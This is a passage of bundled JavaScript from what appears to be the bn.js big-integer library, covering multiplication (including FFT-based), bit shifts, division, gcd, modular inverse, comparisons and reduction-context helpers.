                        (lo = (lo + Math.imul(al6, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh6)) | 0) + Math.imul(ah6, bl6)) | 0),
                        (hi = (hi + Math.imul(ah6, bh6)) | 0),
                        (lo = (lo + Math.imul(al5, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh7)) | 0) + Math.imul(ah5, bl7)) | 0),
                        (hi = (hi + Math.imul(ah5, bh7)) | 0),
                        (lo = (lo + Math.imul(al4, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh8)) | 0) + Math.imul(ah4, bl8)) | 0),
                        (hi = (hi + Math.imul(ah4, bh8)) | 0);
                    var w12 = (((c + (lo = (lo + Math.imul(al3, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al3, bh9)) | 0) + Math.imul(ah3, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah3, bh9)) | 0) + (mid >>> 13)) | 0) + (w12 >>> 26)) | 0),
                        (w12 &= 67108863),
                        (lo = Math.imul(al9, bl4)),
                        (mid = ((mid = Math.imul(al9, bh4)) + Math.imul(ah9, bl4)) | 0),
                        (hi = Math.imul(ah9, bh4)),
                        (lo = (lo + Math.imul(al8, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh5)) | 0) + Math.imul(ah8, bl5)) | 0),
                        (hi = (hi + Math.imul(ah8, bh5)) | 0),
                        (lo = (lo + Math.imul(al7, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh6)) | 0) + Math.imul(ah7, bl6)) | 0),
                        (hi = (hi + Math.imul(ah7, bh6)) | 0),
                        (lo = (lo + Math.imul(al6, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh7)) | 0) + Math.imul(ah6, bl7)) | 0),
                        (hi = (hi + Math.imul(ah6, bh7)) | 0),
                        (lo = (lo + Math.imul(al5, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh8)) | 0) + Math.imul(ah5, bl8)) | 0),
                        (hi = (hi + Math.imul(ah5, bh8)) | 0);
                    var w13 = (((c + (lo = (lo + Math.imul(al4, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al4, bh9)) | 0) + Math.imul(ah4, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah4, bh9)) | 0) + (mid >>> 13)) | 0) + (w13 >>> 26)) | 0),
                        (w13 &= 67108863),
                        (lo = Math.imul(al9, bl5)),
                        (mid = ((mid = Math.imul(al9, bh5)) + Math.imul(ah9, bl5)) | 0),
                        (hi = Math.imul(ah9, bh5)),
                        (lo = (lo + Math.imul(al8, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh6)) | 0) + Math.imul(ah8, bl6)) | 0),
                        (hi = (hi + Math.imul(ah8, bh6)) | 0),
                        (lo = (lo + Math.imul(al7, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh7)) | 0) + Math.imul(ah7, bl7)) | 0),
                        (hi = (hi + Math.imul(ah7, bh7)) | 0),
                        (lo = (lo + Math.imul(al6, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh8)) | 0) + Math.imul(ah6, bl8)) | 0),
                        (hi = (hi + Math.imul(ah6, bh8)) | 0);
                    var w14 = (((c + (lo = (lo + Math.imul(al5, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al5, bh9)) | 0) + Math.imul(ah5, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah5, bh9)) | 0) + (mid >>> 13)) | 0) + (w14 >>> 26)) | 0),
                        (w14 &= 67108863),
                        (lo = Math.imul(al9, bl6)),
                        (mid = ((mid = Math.imul(al9, bh6)) + Math.imul(ah9, bl6)) | 0),
                        (hi = Math.imul(ah9, bh6)),
                        (lo = (lo + Math.imul(al8, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh7)) | 0) + Math.imul(ah8, bl7)) | 0),
                        (hi = (hi + Math.imul(ah8, bh7)) | 0),
                        (lo = (lo + Math.imul(al7, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh8)) | 0) + Math.imul(ah7, bl8)) | 0),
                        (hi = (hi + Math.imul(ah7, bh8)) | 0);
                    var w15 = (((c + (lo = (lo + Math.imul(al6, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al6, bh9)) | 0) + Math.imul(ah6, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah6, bh9)) | 0) + (mid >>> 13)) | 0) + (w15 >>> 26)) | 0),
                        (w15 &= 67108863),
                        (lo = Math.imul(al9, bl7)),
                        (mid = ((mid = Math.imul(al9, bh7)) + Math.imul(ah9, bl7)) | 0),
                        (hi = Math.imul(ah9, bh7)),
                        (lo = (lo + Math.imul(al8, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh8)) | 0) + Math.imul(ah8, bl8)) | 0),
                        (hi = (hi + Math.imul(ah8, bh8)) | 0);
                    var w16 = (((c + (lo = (lo + Math.imul(al7, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al7, bh9)) | 0) + Math.imul(ah7, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah7, bh9)) | 0) + (mid >>> 13)) | 0) + (w16 >>> 26)) | 0),
                        (w16 &= 67108863),
                        (lo = Math.imul(al9, bl8)),
                        (mid = ((mid = Math.imul(al9, bh8)) + Math.imul(ah9, bl8)) | 0),
                        (hi = Math.imul(ah9, bh8));
                    var w17 = (((c + (lo = (lo + Math.imul(al8, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al8, bh9)) | 0) + Math.imul(ah8, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah8, bh9)) | 0) + (mid >>> 13)) | 0) + (w17 >>> 26)) | 0), (w17 &= 67108863);
                    var w18 = (((c + (lo = Math.imul(al9, bl9))) | 0) + ((8191 & (mid = ((mid = Math.imul(al9, bh9)) + Math.imul(ah9, bl9)) | 0)) << 13)) | 0;
                    return (
                        (c = ((((hi = Math.imul(ah9, bh9)) + (mid >>> 13)) | 0) + (w18 >>> 26)) | 0),
                        (w18 &= 67108863),
                        (o[0] = w0),
                        (o[1] = w1),
                        (o[2] = w2),
                        (o[3] = w3),
                        (o[4] = w4),
                        (o[5] = w5),
                        (o[6] = w6),
                        (o[7] = w7),
                        (o[8] = w8),
                        (o[9] = w9),
                        (o[10] = w10),
                        (o[11] = w11),
                        (o[12] = w12),
                        (o[13] = w13),
                        (o[14] = w14),
                        (o[15] = w15),
                        (o[16] = w16),
                        (o[17] = w17),
                        (o[18] = w18),
                        0 !== c && ((o[19] = c), out.length++),
                        out
                    );
                };
                function jumboMulTo(self, num, out) {
                    return new FFTM().mulp(self, num, out);
                }
                function FFTM(x, y) {
                    (this.x = x), (this.y = y);
                }
                Math.imul || (comb10MulTo = smallMulTo),
                    (BN.prototype.mulTo = function (num, out) {
                        var len = this.length + num.length;
                        return 10 === this.length && 10 === num.length
                            ? comb10MulTo(this, num, out)
                            : len < 63
                            ? smallMulTo(this, num, out)
                            : len < 1024
                            ? (function (self, num, out) {
                                  (out.negative = num.negative ^ self.negative), (out.length = self.length + num.length);
                                  for (var carry = 0, hncarry = 0, k = 0; k < out.length - 1; k++) {
                                      var ncarry = hncarry;
                                      hncarry = 0;
                                      for (var rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                                          var i = k - j,
                                              r = (0 | self.words[i]) * (0 | num.words[j]),
                                              lo = 67108863 & r;
                                          (rword = 67108863 & (lo = (lo + rword) | 0)), (hncarry += (ncarry = ((ncarry = (ncarry + ((r / 67108864) | 0)) | 0) + (lo >>> 26)) | 0) >>> 26), (ncarry &= 67108863);
                                      }
                                      (out.words[k] = rword), (carry = ncarry), (ncarry = hncarry);
                                  }
                                  return 0 !== carry ? (out.words[k] = carry) : out.length--, out.strip();
                              })(this, num, out)
                            : jumboMulTo(this, num, out);
                    }),
                    (FFTM.prototype.makeRBT = function (N) {
                        for (var t = new Array(N), l = BN.prototype._countBits(N) - 1, i = 0; i < N; i++) t[i] = this.revBin(i, l, N);
                        return t;
                    }),
                    (FFTM.prototype.revBin = function (x, l, N) {
                        if (0 === x || x === N - 1) return x;
                        for (var rb = 0, i = 0; i < l; i++) (rb |= (1 & x) << (l - i - 1)), (x >>= 1);
                        return rb;
                    }),
                    (FFTM.prototype.permute = function (rbt, rws, iws, rtws, itws, N) {
                        for (var i = 0; i < N; i++) (rtws[i] = rws[rbt[i]]), (itws[i] = iws[rbt[i]]);
                    }),
                    (FFTM.prototype.transform = function (rws, iws, rtws, itws, N, rbt) {
                        this.permute(rbt, rws, iws, rtws, itws, N);
                        for (var s = 1; s < N; s <<= 1)
                            for (var l = s << 1, rtwdf = Math.cos((2 * Math.PI) / l), itwdf = Math.sin((2 * Math.PI) / l), p = 0; p < N; p += l)
                                for (var rtwdf_ = rtwdf, itwdf_ = itwdf, j = 0; j < s; j++) {
                                    var re = rtws[p + j],
                                        ie = itws[p + j],
                                        ro = rtws[p + j + s],
                                        io = itws[p + j + s],
                                        rx = rtwdf_ * ro - itwdf_ * io;
                                    (io = rtwdf_ * io + itwdf_ * ro),
                                        (ro = rx),
                                        (rtws[p + j] = re + ro),
                                        (itws[p + j] = ie + io),
                                        (rtws[p + j + s] = re - ro),
                                        (itws[p + j + s] = ie - io),
                                        j !== l && ((rx = rtwdf * rtwdf_ - itwdf * itwdf_), (itwdf_ = rtwdf * itwdf_ + itwdf * rtwdf_), (rtwdf_ = rx));
                                }
                    }),
                    (FFTM.prototype.guessLen13b = function (n, m) {
                        var N = 1 | Math.max(m, n),
                            odd = 1 & N,
                            i = 0;
                        for (N = (N / 2) | 0; N; N >>>= 1) i++;
                        return 1 << (i + 1 + odd);
                    }),
                    (FFTM.prototype.conjugate = function (rws, iws, N) {
                        if (!(N <= 1))
                            for (var i = 0; i < N / 2; i++) {
                                var t = rws[i];
                                (rws[i] = rws[N - i - 1]), (rws[N - i - 1] = t), (t = iws[i]), (iws[i] = -iws[N - i - 1]), (iws[N - i - 1] = -t);
                            }
                    }),
                    (FFTM.prototype.normalize13b = function (ws, N) {
                        for (var carry = 0, i = 0; i < N / 2; i++) {
                            var w = 8192 * Math.round(ws[2 * i + 1] / N) + Math.round(ws[2 * i] / N) + carry;
                            (ws[i] = 67108863 & w), (carry = w < 67108864 ? 0 : (w / 67108864) | 0);
                        }
                        return ws;
                    }),
                    (FFTM.prototype.convert13b = function (ws, len, rws, N) {
                        for (var carry = 0, i = 0; i < len; i++) (carry += 0 | ws[i]), (rws[2 * i] = 8191 & carry), (carry >>>= 13), (rws[2 * i + 1] = 8191 & carry), (carry >>>= 13);
                        for (i = 2 * len; i < N; ++i) rws[i] = 0;
                        assert(0 === carry), assert(0 == (-8192 & carry));
                    }),
                    (FFTM.prototype.stub = function (N) {
                        for (var ph = new Array(N), i = 0; i < N; i++) ph[i] = 0;
                        return ph;
                    }),
                    (FFTM.prototype.mulp = function (x, y, out) {
                        var N = 2 * this.guessLen13b(x.length, y.length),
                            rbt = this.makeRBT(N),
                            _ = this.stub(N),
                            rws = new Array(N),
                            rwst = new Array(N),
                            iwst = new Array(N),
                            nrws = new Array(N),
                            nrwst = new Array(N),
                            niwst = new Array(N),
                            rmws = out.words;
                        (rmws.length = N), this.convert13b(x.words, x.length, rws, N), this.convert13b(y.words, y.length, nrws, N), this.transform(rws, _, rwst, iwst, N, rbt), this.transform(nrws, _, nrwst, niwst, N, rbt);
                        for (var i = 0; i < N; i++) {
                            var rx = rwst[i] * nrwst[i] - iwst[i] * niwst[i];
                            (iwst[i] = rwst[i] * niwst[i] + iwst[i] * nrwst[i]), (rwst[i] = rx);
                        }
                        return (
                            this.conjugate(rwst, iwst, N),
                            this.transform(rwst, iwst, rmws, _, N, rbt),
                            this.conjugate(rmws, _, N),
                            this.normalize13b(rmws, N),
                            (out.negative = x.negative ^ y.negative),
                            (out.length = x.length + y.length),
                            out.strip()
                        );
                    }),
                    (BN.prototype.mul = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), this.mulTo(num, out);
                    }),
                    (BN.prototype.mulf = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), jumboMulTo(this, num, out);
                    }),
                    (BN.prototype.imul = function (num) {
                        return this.clone().mulTo(num, this);
                    }),
                    (BN.prototype.imuln = function (num) {
                        assert("number" == typeof num), assert(num < 67108864);
                        for (var carry = 0, i = 0; i < this.length; i++) {
                            var w = (0 | this.words[i]) * num,
                                lo = (67108863 & w) + (67108863 & carry);
                            (carry >>= 26), (carry += (w / 67108864) | 0), (carry += lo >>> 26), (this.words[i] = 67108863 & lo);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), this;
                    }),
                    (BN.prototype.muln = function (num) {
                        return this.clone().imuln(num);
                    }),
                    (BN.prototype.sqr = function () {
                        return this.mul(this);
                    }),
                    (BN.prototype.isqr = function () {
                        return this.imul(this.clone());
                    }),
                    (BN.prototype.pow = function (num) {
                        var w = (function (num) {
                            for (var w = new Array(num.bitLength()), bit = 0; bit < w.length; bit++) {
                                var off = (bit / 26) | 0,
                                    wbit = bit % 26;
                                w[bit] = (num.words[off] & (1 << wbit)) >>> wbit;
                            }
                            return w;
                        })(num);
                        if (0 === w.length) return new BN(1);
                        for (var res = this, i = 0; i < w.length && 0 === w[i]; i++, res = res.sqr());
                        if (++i < w.length) for (var q = res.sqr(); i < w.length; i++, q = q.sqr()) 0 !== w[i] && (res = res.mul(q));
                        return res;
                    }),
                    (BN.prototype.iushln = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var i,
                            r = bits % 26,
                            s = (bits - r) / 26,
                            carryMask = (67108863 >>> (26 - r)) << (26 - r);
                        if (0 !== r) {
                            var carry = 0;
                            for (i = 0; i < this.length; i++) {
                                var newCarry = this.words[i] & carryMask,
                                    c = ((0 | this.words[i]) - newCarry) << r;
                                (this.words[i] = c | carry), (carry = newCarry >>> (26 - r));
                            }
                            carry && ((this.words[i] = carry), this.length++);
                        }
                        if (0 !== s) {
                            for (i = this.length - 1; i >= 0; i--) this.words[i + s] = this.words[i];
                            for (i = 0; i < s; i++) this.words[i] = 0;
                            this.length += s;
                        }
                        return this.strip();
                    }),
                    (BN.prototype.ishln = function (bits) {
                        return assert(0 === this.negative), this.iushln(bits);
                    }),
                    (BN.prototype.iushrn = function (bits, hint, extended) {
                        var h;
                        assert("number" == typeof bits && bits >= 0), (h = hint ? (hint - (hint % 26)) / 26 : 0);
                        var r = bits % 26,
                            s = Math.min((bits - r) / 26, this.length),
                            mask = 67108863 ^ ((67108863 >>> r) << r),
                            maskedWords = extended;
                        if (((h -= s), (h = Math.max(0, h)), maskedWords)) {
                            for (var i = 0; i < s; i++) maskedWords.words[i] = this.words[i];
                            maskedWords.length = s;
                        }
                        if (0 === s);
                        else if (this.length > s) for (this.length -= s, i = 0; i < this.length; i++) this.words[i] = this.words[i + s];
                        else (this.words[0] = 0), (this.length = 1);
                        var carry = 0;
                        for (i = this.length - 1; i >= 0 && (0 !== carry || i >= h); i--) {
                            var word = 0 | this.words[i];
                            (this.words[i] = (carry << (26 - r)) | (word >>> r)), (carry = word & mask);
                        }
                        return maskedWords && 0 !== carry && (maskedWords.words[maskedWords.length++] = carry), 0 === this.length && ((this.words[0] = 0), (this.length = 1)), this.strip();
                    }),
                    (BN.prototype.ishrn = function (bits, hint, extended) {
                        return assert(0 === this.negative), this.iushrn(bits, hint, extended);
                    }),
                    (BN.prototype.shln = function (bits) {
                        return this.clone().ishln(bits);
                    }),
                    (BN.prototype.ushln = function (bits) {
                        return this.clone().iushln(bits);
                    }),
                    (BN.prototype.shrn = function (bits) {
                        return this.clone().ishrn(bits);
                    }),
                    (BN.prototype.ushrn = function (bits) {
                        return this.clone().iushrn(bits);
                    }),
                    (BN.prototype.testn = function (bit) {
                        assert("number" == typeof bit && bit >= 0);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        return !(this.length <= s) && !!(this.words[s] & q);
                    }),
                    (BN.prototype.imaskn = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var r = bits % 26,
                            s = (bits - r) / 26;
                        if ((assert(0 === this.negative, "imaskn works only with positive numbers"), this.length <= s)) return this;
                        if ((0 !== r && s++, (this.length = Math.min(s, this.length)), 0 !== r)) {
                            var mask = 67108863 ^ ((67108863 >>> r) << r);
                            this.words[this.length - 1] &= mask;
                        }
                        return this.strip();
                    }),
                    (BN.prototype.maskn = function (bits) {
                        return this.clone().imaskn(bits);
                    }),
                    (BN.prototype.iaddn = function (num) {
                        return (
                            assert("number" == typeof num),
                            assert(num < 67108864),
                            num < 0
                                ? this.isubn(-num)
                                : 0 !== this.negative
                                ? 1 === this.length && (0 | this.words[0]) < num
                                    ? ((this.words[0] = num - (0 | this.words[0])), (this.negative = 0), this)
                                    : ((this.negative = 0), this.isubn(num), (this.negative = 1), this)
                                : this._iaddn(num)
                        );
                    }),
                    (BN.prototype._iaddn = function (num) {
                        this.words[0] += num;
                        for (var i = 0; i < this.length && this.words[i] >= 67108864; i++) (this.words[i] -= 67108864), i === this.length - 1 ? (this.words[i + 1] = 1) : this.words[i + 1]++;
                        return (this.length = Math.max(this.length, i + 1)), this;
                    }),
                    (BN.prototype.isubn = function (num) {
                        if ((assert("number" == typeof num), assert(num < 67108864), num < 0)) return this.iaddn(-num);
                        if (0 !== this.negative) return (this.negative = 0), this.iaddn(num), (this.negative = 1), this;
                        if (((this.words[0] -= num), 1 === this.length && this.words[0] < 0)) (this.words[0] = -this.words[0]), (this.negative = 1);
                        else for (var i = 0; i < this.length && this.words[i] < 0; i++) (this.words[i] += 67108864), (this.words[i + 1] -= 1);
                        return this.strip();
                    }),
                    (BN.prototype.addn = function (num) {
                        return this.clone().iaddn(num);
                    }),
                    (BN.prototype.subn = function (num) {
                        return this.clone().isubn(num);
                    }),
                    (BN.prototype.iabs = function () {
                        return (this.negative = 0), this;
                    }),
                    (BN.prototype.abs = function () {
                        return this.clone().iabs();
                    }),
                    (BN.prototype._ishlnsubmul = function (num, mul, shift) {
                        var i,
                            w,
                            len = num.length + shift;
                        this._expand(len);
                        var carry = 0;
                        for (i = 0; i < num.length; i++) {
                            w = (0 | this.words[i + shift]) + carry;
                            var right = (0 | num.words[i]) * mul;
                            (carry = ((w -= 67108863 & right) >> 26) - ((right / 67108864) | 0)), (this.words[i + shift] = 67108863 & w);
                        }
                        for (; i < this.length - shift; i++) (carry = (w = (0 | this.words[i + shift]) + carry) >> 26), (this.words[i + shift] = 67108863 & w);
                        if (0 === carry) return this.strip();
                        for (assert(-1 === carry), carry = 0, i = 0; i < this.length; i++) (carry = (w = -(0 | this.words[i]) + carry) >> 26), (this.words[i] = 67108863 & w);
                        return (this.negative = 1), this.strip();
                    }),
                    (BN.prototype._wordDiv = function (num, mode) {
                        var shift = (this.length, num.length),
                            a = this.clone(),
                            b = num,
                            bhi = 0 | b.words[b.length - 1];
                        0 !== (shift = 26 - this._countBits(bhi)) && ((b = b.ushln(shift)), a.iushln(shift), (bhi = 0 | b.words[b.length - 1]));
                        var q,
                            m = a.length - b.length;
                        if ("mod" !== mode) {
                            ((q = new BN(null)).length = m + 1), (q.words = new Array(q.length));
                            for (var i = 0; i < q.length; i++) q.words[i] = 0;
                        }
                        var diff = a.clone()._ishlnsubmul(b, 1, m);
                        0 === diff.negative && ((a = diff), q && (q.words[m] = 1));
                        for (var j = m - 1; j >= 0; j--) {
                            var qj = 67108864 * (0 | a.words[b.length + j]) + (0 | a.words[b.length + j - 1]);
                            for (qj = Math.min((qj / bhi) | 0, 67108863), a._ishlnsubmul(b, qj, j); 0 !== a.negative; ) qj--, (a.negative = 0), a._ishlnsubmul(b, 1, j), a.isZero() || (a.negative ^= 1);
                            q && (q.words[j] = qj);
                        }
                        return q && q.strip(), a.strip(), "div" !== mode && 0 !== shift && a.iushrn(shift), { div: q || null, mod: a };
                    }),
                    (BN.prototype.divmod = function (num, mode, positive) {
                        return (
                            assert(!num.isZero()),
                            this.isZero()
                                ? { div: new BN(0), mod: new BN(0) }
                                : 0 !== this.negative && 0 === num.negative
                                ? ((res = this.neg().divmod(num, mode)), "mod" !== mode && (div = res.div.neg()), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.iadd(num)), { div: div, mod: mod })
                                : 0 === this.negative && 0 !== num.negative
                                ? ((res = this.divmod(num.neg(), mode)), "mod" !== mode && (div = res.div.neg()), { div: div, mod: res.mod })
                                : 0 != (this.negative & num.negative)
                                ? ((res = this.neg().divmod(num.neg(), mode)), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.isub(num)), { div: res.div, mod: mod })
                                : num.length > this.length || this.cmp(num) < 0
                                ? { div: new BN(0), mod: this }
                                : 1 === num.length
                                ? "div" === mode
                                    ? { div: this.divn(num.words[0]), mod: null }
                                    : "mod" === mode
                                    ? { div: null, mod: new BN(this.modn(num.words[0])) }
                                    : { div: this.divn(num.words[0]), mod: new BN(this.modn(num.words[0])) }
                                : this._wordDiv(num, mode)
                        );
                        var div, mod, res;
                    }),
                    (BN.prototype.div = function (num) {
                        return this.divmod(num, "div", !1).div;
                    }),
                    (BN.prototype.mod = function (num) {
                        return this.divmod(num, "mod", !1).mod;
                    }),
                    (BN.prototype.umod = function (num) {
                        return this.divmod(num, "mod", !0).mod;
                    }),
                    (BN.prototype.divRound = function (num) {
                        var dm = this.divmod(num);
                        if (dm.mod.isZero()) return dm.div;
                        var mod = 0 !== dm.div.negative ? dm.mod.isub(num) : dm.mod,
                            half = num.ushrn(1),
                            r2 = num.andln(1),
                            cmp = mod.cmp(half);
                        return cmp < 0 || (1 === r2 && 0 === cmp) ? dm.div : 0 !== dm.div.negative ? dm.div.isubn(1) : dm.div.iaddn(1);
                    }),
                    (BN.prototype.modn = function (num) {
                        assert(num <= 67108863);
                        for (var p = (1 << 26) % num, acc = 0, i = this.length - 1; i >= 0; i--) acc = (p * acc + (0 | this.words[i])) % num;
                        return acc;
                    }),
                    (BN.prototype.idivn = function (num) {
                        assert(num <= 67108863);
                        for (var carry = 0, i = this.length - 1; i >= 0; i--) {
                            var w = (0 | this.words[i]) + 67108864 * carry;
                            (this.words[i] = (w / num) | 0), (carry = w % num);
                        }
                        return this.strip();
                    }),
                    (BN.prototype.divn = function (num) {
                        return this.clone().idivn(num);
                    }),
                    (BN.prototype.egcd = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var x = this,
                            y = p.clone();
                        x = 0 !== x.negative ? x.umod(p) : x.clone();
                        for (var A = new BN(1), B = new BN(0), C = new BN(0), D = new BN(1), g = 0; x.isEven() && y.isEven(); ) x.iushrn(1), y.iushrn(1), ++g;
                        for (var yp = y.clone(), xp = x.clone(); !x.isZero(); ) {
                            for (var i = 0, im = 1; 0 == (x.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (x.iushrn(i); i-- > 0; ) (A.isOdd() || B.isOdd()) && (A.iadd(yp), B.isub(xp)), A.iushrn(1), B.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (y.words[0] & jm) && j < 26; ++j, jm <<= 1);
                            if (j > 0) for (y.iushrn(j); j-- > 0; ) (C.isOdd() || D.isOdd()) && (C.iadd(yp), D.isub(xp)), C.iushrn(1), D.iushrn(1);
                            x.cmp(y) >= 0 ? (x.isub(y), A.isub(C), B.isub(D)) : (y.isub(x), C.isub(A), D.isub(B));
                        }
                        return { a: C, b: D, gcd: y.iushln(g) };
                    }),
                    (BN.prototype._invmp = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var a = this,
                            b = p.clone();
                        a = 0 !== a.negative ? a.umod(p) : a.clone();
                        for (var res, x1 = new BN(1), x2 = new BN(0), delta = b.clone(); a.cmpn(1) > 0 && b.cmpn(1) > 0; ) {
                            for (var i = 0, im = 1; 0 == (a.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (a.iushrn(i); i-- > 0; ) x1.isOdd() && x1.iadd(delta), x1.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (b.words[0] & jm) && j < 26; ++j, jm <<= 1);
                            if (j > 0) for (b.iushrn(j); j-- > 0; ) x2.isOdd() && x2.iadd(delta), x2.iushrn(1);
                            a.cmp(b) >= 0 ? (a.isub(b), x1.isub(x2)) : (b.isub(a), x2.isub(x1));
                        }
                        return (res = 0 === a.cmpn(1) ? x1 : x2).cmpn(0) < 0 && res.iadd(p), res;
                    }),
                    (BN.prototype.gcd = function (num) {
                        if (this.isZero()) return num.abs();
                        if (num.isZero()) return this.abs();
                        var a = this.clone(),
                            b = num.clone();
                        (a.negative = 0), (b.negative = 0);
                        for (var shift = 0; a.isEven() && b.isEven(); shift++) a.iushrn(1), b.iushrn(1);
                        for (;;) {
                            for (; a.isEven(); ) a.iushrn(1);
                            for (; b.isEven(); ) b.iushrn(1);
                            var r = a.cmp(b);
                            if (r < 0) {
                                var t = a;
                                (a = b), (b = t);
                            } else if (0 === r || 0 === b.cmpn(1)) break;
                            a.isub(b);
                        }
                        return b.iushln(shift);
                    }),
                    (BN.prototype.invm = function (num) {
                        return this.egcd(num).a.umod(num);
                    }),
                    (BN.prototype.isEven = function () {
                        return 0 == (1 & this.words[0]);
                    }),
                    (BN.prototype.isOdd = function () {
                        return 1 == (1 & this.words[0]);
                    }),
                    (BN.prototype.andln = function (num) {
                        return this.words[0] & num;
                    }),
                    (BN.prototype.bincn = function (bit) {
                        assert("number" == typeof bit);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        if (this.length <= s) return this._expand(s + 1), (this.words[s] |= q), this;
                        for (var carry = q, i = s; 0 !== carry && i < this.length; i++) {
                            var w = 0 | this.words[i];
                            (carry = (w += carry) >>> 26), (w &= 67108863), (this.words[i] = w);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), this;
                    }),
                    (BN.prototype.isZero = function () {
                        return 1 === this.length && 0 === this.words[0];
                    }),
                    (BN.prototype.cmpn = function (num) {
                        var res,
                            negative = num < 0;
                        if (0 !== this.negative && !negative) return -1;
                        if (0 === this.negative && negative) return 1;
                        if ((this.strip(), this.length > 1)) res = 1;
                        else {
                            negative && (num = -num), assert(num <= 67108863, "Number is too big");
                            var w = 0 | this.words[0];
                            res = w === num ? 0 : w < num ? -1 : 1;
                        }
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.cmp = function (num) {
                        if (0 !== this.negative && 0 === num.negative) return -1;
                        if (0 === this.negative && 0 !== num.negative) return 1;
                        var res = this.ucmp(num);
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.ucmp = function (num) {
                        if (this.length > num.length) return 1;
                        if (this.length < num.length) return -1;
                        for (var res = 0, i = this.length - 1; i >= 0; i--) {
                            var a = 0 | this.words[i],
                                b = 0 | num.words[i];
                            if (a !== b) {
                                a < b ? (res = -1) : a > b && (res = 1);
                                break;
                            }
                        }
                        return res;
                    }),
                    (BN.prototype.gtn = function (num) {
                        return 1 === this.cmpn(num);
                    }),
                    (BN.prototype.gt = function (num) {
                        return 1 === this.cmp(num);
                    }),
                    (BN.prototype.gten = function (num) {
                        return this.cmpn(num) >= 0;
                    }),
                    (BN.prototype.gte = function (num) {
                        return this.cmp(num) >= 0;
                    }),
                    (BN.prototype.ltn = function (num) {
                        return -1 === this.cmpn(num);
                    }),
                    (BN.prototype.lt = function (num) {
                        return -1 === this.cmp(num);
                    }),
                    (BN.prototype.lten = function (num) {
                        return this.cmpn(num) <= 0;
                    }),
                    (BN.prototype.lte = function (num) {
                        return this.cmp(num) <= 0;
                    }),
                    (BN.prototype.eqn = function (num) {
                        return 0 === this.cmpn(num);
                    }),
                    (BN.prototype.eq = function (num) {
                        return 0 === this.cmp(num);
                    }),
                    (BN.red = function (num) {
                        return new Red(num);
                    }),
                    (BN.prototype.toRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), assert(0 === this.negative, "red works only with positives"), ctx.convertTo(this)._forceRed(ctx);
                    }),
                    (BN.prototype.fromRed = function () {
                        return assert(this.red, "fromRed works only with numbers in reduction context"), this.red.convertFrom(this);
                    }),
                    (BN.prototype._forceRed = function (ctx) {
                        return (this.red = ctx), this;
                    }),
                    (BN.prototype.forceRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), this._forceRed(ctx);
                    }),
                    (BN.prototype.redAdd = function (num) {
                        return assert(this.red, "redAdd works only with red numbers"), this.red.add(this, num);
                    }),
                    (BN.prototype.redIAdd = function (num) {
                        return assert(this.red, "redIAdd works only with red numbers"), this.red.iadd(this, num);
                    }),
                    (BN.prototype.redSub = function (num) {
                        return assert(this.red, "redSub works only with red numbers"), this.red.sub(this, num);
                    }),
                    (BN.prototype.redISub = function (num) {
                        return assert(this.red, "redISub works only with red numbers"), this.red.isub(this, num);
                    }),
                    (BN.prototype.redShl = function (num) {
                        return assert(this.red, "redShl works only with red numbers"), this.red.shl(this, num);
                    }),
                    (BN.prototype.redMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.mul(this, num);
                    }),
                    (BN.prototype.redIMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.imul(this, num);
                    }),
                    (BN.prototype.redSqr = function () {
